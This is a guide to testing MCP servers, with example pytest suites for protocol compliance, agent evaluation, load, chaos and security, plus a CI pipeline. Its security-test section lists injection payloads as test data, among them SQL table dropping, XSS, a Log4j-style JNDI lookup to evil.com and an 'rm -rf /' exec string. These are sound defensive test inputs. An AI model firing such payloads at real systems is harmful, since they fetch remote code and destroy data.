# Test — Comprehensive MCP Server Validation

Validate MCP servers for correctness, safety, performance, and AI agent compatibility. Focus on behavior, contracts, and real-world agent interactions through systematic testing approaches.

## Testing Philosophy

### Core Testing Principles

- **Behavior-driven validation**: Test what the server does, not just how it's implemented
- **Contract-first testing**: Validate schemas, inputs, outputs, and side effects rigorously
- **Agent-centric evaluation**: Test how AI agents actually interact with your tools
- **Production simulation**: Test with realistic data, load patterns, and failure scenarios
- **Continuous validation**: Integrate testing into development workflow and deployment pipeline

### Quality Gates and Success Criteria

- **Functional correctness**: All tools produce expected outputs for valid inputs
- **Safety and security**: Invalid inputs are rejected, authorization is enforced
- **Performance standards**: Latency and throughput meet defined SLOs
- **Agent usability**: AI agents can discover, understand, and effectively use tools
- **Reliability**: Server handles failures gracefully and maintains availability

## Testing Pyramid for MCP Servers

### Unit Tests (Foundation - 60-70%)

**Purpose**: Fast, isolated validation of individual components and business logic

**Focus areas:**
- Tool logic and algorithms
- Input validation and sanitization
- Error handling and edge cases
- Configuration management
- Utility functions and helpers

**Example unit test structure:**
```python
import pytest
from unittest.mock import Mock, patch
from your_server.tools import process_data

class TestProcessDataTool:
    def test_valid_input_processing(self):
        """Test tool with valid input produces expected output"""
        result = process_data("valid input", {"option": "value"})
        assert result.success is True
        assert result.data == expected_output
    
    def test_invalid_input_rejection(self):
        """Test tool properly rejects invalid input"""
        with pytest.raises(ValueError, match="Invalid input format"):
            process_data("", {})
    
    def test_edge_case_handling(self):
        """Test tool handles edge cases gracefully"""
        large_input = "x" * 10000
        result = process_data(large_input, {})
        assert len(result.data) <= 1000  # Truncated appropriately
    
    @patch('your_server.external_api.call_service')
    def test_dependency_failure_handling(self, mock_api):
        """Test tool handles external dependency failures"""
        mock_api.side_effect = ConnectionError("Service unavailable")
        with pytest.raises(ServiceUnavailableError):
            process_data("test", {"use_external": True})
```

### Integration Tests (Structure - 20-30%)

**Purpose**: Validate MCP protocol compliance and component interactions

**Focus areas:**
- MCP protocol message handling
- Tool discovery and schema validation
- Resource access and content delivery
- Authentication and authorization flows
- Database and external service integrations

**MCP protocol integration tests:**
```python
import pytest
from mcp.client import McpClient
from your_server import start_server

@pytest.mark.asyncio
class TestMCPIntegration:
    async def test_server_initialization(self):
        """Test server starts and responds to initialization"""
        async with McpClient() as client:
            info = await client.initialize()
            assert info.protocol_version == "0.1.0"
            assert info.server_info.name == "your-server"
    
    async def test_tool_discovery(self):
        """Test tool discovery returns correct schemas"""
        async with McpClient() as client:
            await client.initialize()
            tools = await client.list_tools()
            
            assert len(tools) > 0
            process_tool = next(t for t in tools if t.name == "process_data")
            assert process_tool.input_schema is not None
            assert "text" in process_tool.input_schema["properties"]
    
    async def test_tool_execution_flow(self):
        """Test complete tool execution workflow"""
        async with McpClient() as client:
            await client.initialize()
            
            result = await client.call_tool(
                "process_data", 
                {"text": "test input", "options": {}}
            )
            
            assert result.is_error is False
            assert "result" in result.content[0].text
    
    async def test_authorization_enforcement(self):
        """Test authorization is properly enforced"""
        async with McpClient(token="invalid") as client:
            await client.initialize()
            
            with pytest.raises(PermissionError):
                await client.call_tool("restricted_tool", {})
```

### End-to-End Tests (Integration - 10-15%)

**Purpose**: Validate complete workflows with real configurations and dependencies

**Focus areas:**
- Gateway integration and routing
- Multi-server orchestration
- Production-like configurations
- Real external service interactions
- Performance under realistic load

**E2E test example:**
```python
import pytest
import asyncio
from test_utils import start_gateway, register_server, create_test_client

@pytest.mark.e2e
class TestCompleteWorkflow:
    @pytest.fixture
    async def gateway_setup(self):
        """Setup gateway with registered server"""
        gateway = await start_gateway()
        await register_server(gateway, "test-server", "http://localhost:8000")
        yield gateway
        await gateway.shutdown()
    
    async def test_client_to_server_via_gateway(self, gateway_setup):
        """Test complete client → gateway → server flow"""
        client = create_test_client(gateway_url="http://localhost:4444")
        
        # Test tool discovery through gateway
        tools = await client.discover_tools()
        assert "process_data" in [t.name for t in tools]
        
        # Test tool execution through gateway
        result = await client.execute_tool(
            "process_data",
            {"text": "integration test", "options": {"format": "json"}}
        )
        
        assert result.success is True
        assert "integration test" in str(result.data)
```

## Agent Evaluation and AI Testing

### Agent Eval Framework

**Purpose**: Evaluate how effectively AI agents can discover, understand, and use your MCP tools

Agent Eval provides systematic evaluation of MCP servers from an AI agent perspective, measuring:
- **Discoverability**: How easily agents find relevant tools
- **Usability**: How successfully agents use tools to complete tasks
- **Reliability**: How consistently tools work across different agent interactions
- **Task completion**: How well agents accomplish goals using your tools

**Agent Eval implementation:**
```python
from agent_eval import Evaluator, TaskSet, Agent

class MCPServerEvaluator:
    def __init__(self, server_url: str):
        self.evaluator = Evaluator()
        self.server_url = server_url
        self.agent = Agent(
            model="claude-3-sonnet",
            mcp_server=server_url
        )
    
    def create_task_suite(self) -> TaskSet:
        """Define evaluation tasks for your MCP server"""
        return TaskSet([
            {
                "name": "data_processing_task",
                "description": "Process user data and return formatted results",
                "input": "Process this CSV data: name,age\\nJohn,25\\nJane,30",
                "expected_capabilities": ["process_data", "format_output"],
                "success_criteria": [
                    "Data is correctly parsed",
                    "Output is properly formatted",
                    "No errors in processing"
                ]
            },
            {
                "name": "error_handling_task", 
                "description": "Handle invalid input gracefully",
                "input": "Process this invalid data: !!!invalid!!!",
                "expected_behavior": "graceful_error_handling",
                "success_criteria": [
                    "Error is caught and handled",
                    "Meaningful error message provided",
                    "Agent can recover and suggest alternatives"
                ]
            }
        ])
    
    async def run_evaluation(self) -> dict:
        """Run comprehensive agent evaluation"""
        task_suite = self.create_task_suite()
        
        results = await self.evaluator.evaluate(
            agent=self.agent,
            tasks=task_suite,
            iterations=10  # Run multiple times for statistical significance
        )
        
        return {
            "overall_score": results.overall_score,
            "task_success_rate": results.task_success_rate,
            "tool_usage_efficiency": results.tool_usage_efficiency,
            "error_handling_score": results.error_handling_score,
            "detailed_results": results.task_results
        }
```

### Cross-Model Validation

**Test with multiple AI models** to ensure broad compatibility:

```python
@pytest.mark.agent_eval
class TestCrossModelCompatibility:
    models = ["claude-3-sonnet", "gpt-4", "gemini-pro"]
    
    @pytest.mark.parametrize("model", models)
    async def test_model_tool_usage(self, model):
        """Test tool usage across different AI models"""
        agent = Agent(model=model, mcp_server=self.server_url)
        
        # Test basic tool discovery
        tools = await agent.discover_tools()
        assert len(tools) > 0
        
        # Test tool usage with standard task
        result = await agent.complete_task(
            "Process the data: name,value\ntest,123",
            available_tools=tools
        )
        
        assert result.success_rate > 0.8  # 80% success threshold
        assert result.tool_calls > 0
        assert "123" in str(result.output)
```

### Behavioral Testing and Golden Sets

**Golden set evaluation** for consistent behavior validation:

```python
class GoldenSetTester:
    def __init__(self):
        self.golden_sets = self.load_golden_sets()
    
    def load_golden_sets(self) -> dict:
        """Load curated test cases with expected outputs"""
        return {
            "data_processing": [
                {
                    "input": {"text": "hello world", "format": "upper"},
                    "expected_output": "HELLO WORLD",
                    "metadata": {"operation": "case_conversion"}
                },
                {
                    "input": {"text": "test@example.com", "format": "email_validation"},
                    "expected_output": {"valid": True, "domain": "example.com"},
                    "metadata": {"operation": "email_processing"}
                }
            ]
        }
    
    async def validate_against_golden_set(self, tool_name: str) -> dict:
        """Validate tool outputs against golden set"""
        test_cases = self.golden_sets.get(tool_name, [])
        results = []
        
        for case in test_cases:
            try:
                actual_output = await call_tool(tool_name, case["input"])
                match = self.compare_outputs(actual_output, case["expected_output"])
                results.append({
                    "test_case": case,
                    "actual_output": actual_output,
                    "matches_expected": match,
                    "passed": match
                })
            except Exception as e:
                results.append({
                    "test_case": case,
                    "error": str(e),
                    "passed": False
                })
        
        return {
            "total_tests": len(test_cases),
            "passed": sum(1 for r in results if r["passed"]),
            "pass_rate": sum(1 for r in results if r["passed"]) / len(test_cases),
            "detailed_results": results
        }
```

## Performance and Load Testing

### Load Testing Strategy

**Establish performance baselines** and validate under realistic load:

```python
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor

class LoadTester:
    def __init__(self, server_url: str):
        self.server_url = server_url
        self.metrics = {
            "requests_sent": 0,
            "requests_successful": 0,
            "response_times": [],
            "errors": []
        }
    
    async def single_request_test(self, tool_name: str, params: dict):
        """Execute single request and measure performance"""
        start_time = time.time()
        
        try:
            result = await call_tool(tool_name, params)
            response_time = time.time() - start_time
            
            self.metrics["requests_sent"] += 1
            self.metrics["requests_successful"] += 1
            self.metrics["response_times"].append(response_time)
            
            return result
            
        except Exception as e:
            self.metrics["requests_sent"] += 1
            self.metrics["errors"].append(str(e))
            raise
    
    async def load_test(self, tool_name: str, params: dict, 
                       concurrent_users: int, duration_seconds: int):
        """Run load test with specified concurrency and duration"""
        end_time = time.time() + duration_seconds
        tasks = []
        
        while time.time() < end_time:
            # Maintain specified concurrency
            active_tasks = [t for t in tasks if not t.done()]
            
            while len(active_tasks) < concurrent_users and time.time() < end_time:
                task = asyncio.create_task(
                    self.single_request_test(tool_name, params)
                )
                tasks.append(task)
                active_tasks.append(task)
                
                # Small delay to prevent overwhelming
                await asyncio.sleep(0.1)
        
        # Wait for remaining tasks
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return self.analyze_results()
    
    def analyze_results(self) -> dict:
        """Analyze load test results"""
        response_times = self.metrics["response_times"]
        
        if not response_times:
            return {"error": "No successful responses recorded"}
        
        return {
            "total_requests": self.metrics["requests_sent"],
            "successful_requests": self.metrics["requests_successful"],
            "error_rate": len(self.metrics["errors"]) / self.metrics["requests_sent"],
            "avg_response_time": sum(response_times) / len(response_times),
            "p50_response_time": sorted(response_times)[len(response_times)//2],
            "p95_response_time": sorted(response_times)[int(len(response_times)*0.95)],
            "p99_response_time": sorted(response_times)[int(len(response_times)*0.99)],
            "requests_per_second": len(response_times) / max(response_times) if response_times else 0
        }

# Usage in tests
@pytest.mark.performance
class TestPerformance:
    async def test_single_user_latency(self):
        """Test response times under normal load"""
        tester = LoadTester("http://localhost:8000")
        
        result = await tester.load_test(
            tool_name="process_data",
            params={"text": "performance test", "options": {}},
            concurrent_users=1,
            duration_seconds=30
        )
        
        assert result["p95_response_time"] < 0.5  # 500ms SLO
        assert result["error_rate"] < 0.01  # <1% error rate
    
    async def test_concurrent_users_throughput(self):
        """Test throughput under concurrent load"""
        tester = LoadTester("http://localhost:8000")
        
        result = await tester.load_test(
            tool_name="process_data",
            params={"text": "load test", "options": {}},
            concurrent_users=10,
            duration_seconds=60
        )
        
        assert result["requests_per_second"] > 50  # Minimum throughput
        assert result["error_rate"] < 0.05  # <5% error rate under load
```

## Security and Safety Testing

### Security Test Suite

**Validate security controls** and resistance to common attacks:

```python
class SecurityTester:
    def __init__(self, server_url: str):
        self.server_url = server_url
    
    async def test_input_injection_attacks(self):
        """Test resistance to injection attacks"""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "'; exec('import os; os.system(\"rm -rf /\")')"
        ]
        
        for payload in injection_payloads:
            try:
                result = await call_tool("process_data", {"text": payload})
                
                # Result should be sanitized, not executed
                assert payload not in str(result)
                assert "<script>" not in str(result).lower()
                assert "drop table" not in str(result).lower()
                
            except ValueError:
                # Input rejection is acceptable
                pass
    
    async def test_authorization_bypass_attempts(self):
        """Test authorization cannot be bypassed"""
        bypass_attempts = [
            {"token": "invalid_token"},
            {"token": "../../../admin_token"},
            {"user_id": -1},
            {"permissions": ["admin", "all"]},
        ]
        
        for attempt in bypass_attempts:
            with pytest.raises((PermissionError, AuthenticationError)):
                await call_tool_with_context("admin_tool", {}, context=attempt)
    
    async def test_rate_limiting(self):
        """Test rate limiting prevents abuse"""
        # Make rapid requests to trigger rate limiting
        tasks = []
        for i in range(100):  # Exceed rate limit
            tasks.append(call_tool("process_data", {"text": f"test {i}"}))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Some requests should be rate limited
        rate_limited_count = sum(1 for r in results if isinstance(r, RateLimitError))
        assert rate_limited_count > 0
```

### Chaos Testing and Fault Injection

**Test resilience under failure conditions**:

```python
class ChaosTester:
    async def test_dependency_failures(self):
        """Test behavior when external dependencies fail"""
        with patch('external_service.call') as mock_service:
            # Simulate various failure modes
            failure_scenarios = [
                ConnectionError("Connection refused"),
                TimeoutError("Request timeout"),
                HTTPError("500 Internal Server Error"),
                json.JSONDecodeError("Invalid JSON", "", 0)
            ]
            
            for error in failure_scenarios:
                mock_service.side_effect = error
                
                result = await call_tool("external_dependent_tool", {"param": "test"})
                
                # Should fail gracefully with meaningful error
                assert "error" in result
                assert "temporarily unavailable" in result["error"].lower()
    
    async def test_resource_exhaustion(self):
        """Test behavior under resource constraints"""
        # Test with large inputs to stress memory
        large_input = "x" * (10 * 1024 * 1024)  # 10MB
        
        try:
            result = await call_tool("process_data", {"text": large_input})
            
            # Should either process successfully or fail gracefully
            assert result is not None
            
        except ResourceExhaustedError as e:
            # Graceful resource exhaustion handling is acceptable
            assert "resource limit" in str(e).lower()
```

## Automated Testing and CI/CD Integration

### Continuous Integration Pipeline

**Integrate all testing levels** into your CI/CD pipeline:

```yaml
# .github/workflows/test.yml (example)
name: Comprehensive Testing Pipeline

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: |
          pip install uv
          uv pip install -e .[test]
      
      - name: Run unit tests
        run: |
          pytest tests/unit/ -v --cov=src --cov-report=xml
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
  
  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    steps:
      - name: Start test server
        run: |
          python -m src.server &
          sleep 5
      
      - name: Run integration tests
        run: |
          pytest tests/integration/ -v
  
  agent-evaluation:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
      - name: Run Agent Eval
        run: |
          python -m tests.agent_eval --iterations=5
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
  
  performance-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
      - name: Run performance tests
        run: |
          pytest tests/performance/ -v --timeout=300
  
  security-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    steps:
      - name: Run security scans
        run: |
          bandit -r src/
          safety check
          pytest tests/security/ -v
```

### Test Automation Best Practices

**Automated test management**:

```python
# conftest.py - Pytest configuration and fixtures
import pytest
import asyncio
from unittest.mock import Mock

@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests"""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()

@pytest.fixture
def mock_external_service():
    """Mock external service for isolated testing"""
    with patch('src.services.external_api') as mock:
        mock.get_data.return_value = {"status": "success", "data": "test"}
        yield mock

@pytest.fixture
async def test_server():
    """Start test server for integration tests"""
    server = await start_test_server(port=8001)
    yield server
    await server.shutdown()

# Parameterized tests for comprehensive coverage
@pytest.mark.parametrize("input_data,expected", [
    ("valid input", "processed: valid input"),
    ("", "error: empty input"),
    ("x" * 1000, "error: input too long"),
])
def test_input_variations(input_data, expected):
    result = process_input(input_data)
    assert expected in str(result)
```

## Testing Standards and Quality Gates

### Coverage Targets and Quality Metrics

**Establish clear quality thresholds**:

- **Unit test coverage**: ≥ 85% for business logic, 100% for critical paths
- **Integration test coverage**: All MCP protocol interactions and external dependencies
- **Agent evaluation score**: ≥ 80% task completion rate across target models
- **Performance targets**: P95 latency < 500ms, throughput > 50 RPS under normal load
- **Security validation**: 100% of security test cases must pass
- **Error handling**: All error scenarios have explicit tests

### Pre-Release Testing Checklist

✅ **Functional Testing**
- [ ] All unit tests passing with required coverage
- [ ] Integration tests validate MCP protocol compliance
- [ ] End-to-end workflows complete successfully
- [ ] Cross-model agent evaluation meets thresholds

✅ **Performance Validation**
- [ ] Load tests confirm SLO compliance
- [ ] Resource usage within acceptable limits
- [ ] Concurrent user scenarios handled properly
- [ ] Performance regression tests passing

✅ **Security and Safety**
- [ ] Input validation prevents injection attacks
- [ ] Authorization controls properly enforced
- [ ] Rate limiting prevents abuse
- [ ] Audit logging captures required events

✅ **Reliability Testing**
- [ ] Chaos tests validate fault tolerance
- [ ] Dependency failure scenarios handled gracefully
- [ ] Circuit breakers and timeouts configured
- [ ] Recovery procedures validated

✅ **Agent Compatibility**
- [ ] Agent Eval scores meet minimum thresholds
- [ ] Tool discovery works across target models
- [ ] Error messages are agent-friendly
- [ ] Documentation supports agent understanding

### Regression Testing and Continuous Monitoring

**Maintain quality over time**:

```python
class RegressionTester:
    def __init__(self):
        self.baseline_metrics = self.load_baseline()
    
    async def detect_regressions(self, current_results: dict) -> dict:
        """Compare current results against baseline"""
        regressions = {}
        
        for metric, current_value in current_results.items():
            baseline_value = self.baseline_metrics.get(metric)
            
            if baseline_value and self.is_regression(metric, current_value, baseline_value):
                regressions[metric] = {
                    "current": current_value,
                    "baseline": baseline_value,
                    "regression_percentage": self.calculate_regression_pct(
                        current_value, baseline_value
                    )
                }
        
        return regressions
    
    def is_regression(self, metric: str, current: float, baseline: float) -> bool:
        """Determine if current value represents a regression"""
        thresholds = {
            "success_rate": 0.05,  # 5% drop is significant
            "avg_response_time": 0.20,  # 20% increase is significant
            "agent_eval_score": 0.10,  # 10% drop is significant
        }
        
        threshold = thresholds.get(metric, 0.15)  # Default 15%
        
        if metric in ["success_rate", "agent_eval_score"]:
            # Lower is worse
            return current < baseline * (1 - threshold)
        else:
            # Higher is worse (latency, error rate)
            return current > baseline * (1 + threshold)
```

## Testing Tools and Infrastructure

### Recommended Testing Stack

**Core testing tools**:
- **pytest**: Primary testing framework with async support
- **pytest-cov**: Code coverage measurement and reporting
- **pytest-mock**: Mocking and patching capabilities
- **Agent Eval**: AI agent evaluation framework
- **locust**: Load testing and performance validation
- **bandit**: Security vulnerability scanning
- **safety**: Dependency vulnerability checking

**Infrastructure tools**:
- **docker-compose**: Reproducible testing environments
- **testcontainers**: Integration testing with real dependencies
- **Github Actions / Jenkins**: CI/CD pipeline automation
- **SonarQube**: Code quality and security analysis
- **Grafana/Prometheus**: Performance monitoring and alerting

---

**Next Steps**: After comprehensive testing, proceed to [Package](../package/) for distribution preparation, then [Deploy](../deploy/) for production rollout strategies.

**See Also**: Develop, Best Practices, Package, Deploy, Operate, Secure.